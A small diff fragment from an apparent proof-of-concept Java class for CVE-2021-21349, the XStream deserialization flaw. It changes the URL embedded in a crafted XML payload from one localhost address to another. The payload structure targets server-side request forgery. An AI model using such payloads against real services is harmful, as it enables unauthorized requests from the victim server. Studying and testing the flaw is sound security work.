@@ -26,7 +26,7 @@ public class CVE_2021_21349 {
                 "                  <queue>\n" +
                 "                    <length>1</length>\n" +
                 "                    <head>\n" +
-                "                      <obj class='url'>http://127.0.0.1:81/su18/</obj>\n" +
+                "                      <obj class='url'>http://127.0.0.1:1234/1</obj>\n" +
                 "                    </head>\n" +
                 "                    <tail reference='../head'/>\n" +
                 "                  </queue>\n" +
